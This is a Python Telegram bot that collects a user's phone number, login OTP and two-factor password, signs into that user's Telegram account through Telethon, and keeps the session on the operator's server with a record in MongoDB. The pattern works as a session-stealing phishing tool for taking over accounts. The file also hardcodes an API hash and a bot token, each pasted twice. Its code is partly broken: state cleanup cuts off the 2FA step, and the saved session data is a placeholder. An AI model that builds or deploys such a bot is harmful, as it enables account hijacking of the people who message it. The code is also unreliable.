import os
from telegram.ext import ApplicationBuilder, MessageHandler, filters
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from pymongo import MongoClient

# Your API credentials from https://my.telegram.org
  # <-- Replace with your API HASH (string)

API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather



# Replace with your token
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"

# Your API credentials from https://my.telegram.org
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"

# MongoDB URL (from Railway environment variable)
MONGO_URL = os.getenv('MONGO_URL')

# MongoDB connection
def connect_to_mongo():
    client = MongoClient(MONGO_URL)
    db = client['telegram_sessions']  # Database name
    return db['sessions']  # Collection name

# Temporary state storage
user_states = {}

# Make sure sessions folder exists (only needed if using local files)
os.makedirs("sessions", exist_ok=True)

# Handle incoming messages
async def message_handler(update, context):
    user_id = update.message.from_user.id
    text = update.message.text.strip()

    if user_id not in user_states:
        # First step: user sends phone number
        user_states[user_id] = {
            'phone': text,
            'step': 'waiting_for_otp'
        }
        
        # Create Telethon client for user
        client = TelegramClient(f"sessions/{user_id}", API_ID, API_HASH)
        await client.connect()
        user_states[user_id]['client'] = client

        try:
            await client.send_code_request(text)
            await update.message.reply_text("📩 OTP has been sent to your Telegram. Please enter the OTP code:")
        except Exception as e:
            await update.message.reply_text(f"❌ Error sending OTP: {e}")
            await client.disconnect()
            del user_states[user_id]

    elif user_states[user_id]['step'] == 'waiting_for_otp':
        # Second step: user sends OTP
        client = user_states[user_id]['client']
        phone = user_states[user_id]['phone']
        otp = text

        try:
            await client.sign_in(phone=phone, code=otp)
            await client.disconnect()

            # Save session to MongoDB
            save_session_to_mongo(user_id, {'phone': phone, 'session_data': 'session_data_placeholder'})

            await update.message.reply_text("✅ Session created successfully!")
            print(f"[+] Session created for {phone}")

        except SessionPasswordNeededError:
            # 2FA enabled, request password
            user_states[user_id]['step'] = 'waiting_for_2fa_password'
            await update.message.reply_text("🔒 2FA is enabled on this account. Please enter your 2FA password:")

        except Exception as e:
            await update.message.reply_text(f"❌ Error logging in: {e}")
            await client.disconnect()

        # Cleanup user state
        if user_id in user_states:
            del user_states[user_id]

    elif user_states[user_id]['step'] == 'waiting_for_2fa_password':
        # Handle 2FA password input
        client = user_states[user_id]['client']
        phone = user_states[user_id]['phone']
        password = text

        try:
            await client.sign_in(password=password)
            # Save session to MongoDB
            save_session_to_mongo(user_id, {'phone': phone, 'session_data': 'session_data_placeholder'})

            # Session created successfully
            await client.disconnect()
            await update.message.reply_text("✅ 2FA password verified. Session created successfully!")
            print(f"[+] 2FA password verified for {phone}")

        except Exception as e:
            await update.message.reply_text(f"❌ Error with 2FA password: {e}")
            await client.disconnect()

        # Cleanup user state
        if user_id in user_states:
            del user_states[user_id]

# Function to save session to MongoDB
def save_session_to_mongo(user_id, session_data):
    collection = connect_to_mongo()
    collection.insert_one({'user_id': user_id, 'session_data': session_data})
    print(f"Session for user {user_id} saved to MongoDB.")

# Main function
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
